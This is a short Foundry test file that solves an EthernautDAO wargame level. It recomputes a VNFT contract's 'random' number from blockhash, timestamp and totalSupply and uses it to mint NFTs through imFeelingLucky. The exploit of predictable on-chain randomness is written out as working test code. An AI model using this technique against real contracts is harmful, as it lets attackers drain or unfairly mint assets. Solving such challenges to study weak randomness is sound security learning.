// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../../src/ethernautDao/level8/VNFT.sol";

contract VNFTTest is Test {
    VNFT public vnft;
    address alice;

    function setUp() public {
        vnft = new VNFT();
        alice = vm.addr(1);
    }

    function testAttackImfeelingLucky() public {
        // random number is generated using block number/timestamp/blockhash, variables that readble on chain so
        // therefore can be known beforehand.
        uint256 randomNumber =
            uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp, vnft.totalSupply()))) % 100;

        vm.prank(alice);
        vnft.imFeelingLucky(alice, 2, randomNumber);

        assertEq(vnft.balanceOf(alice), 2);
    }
}
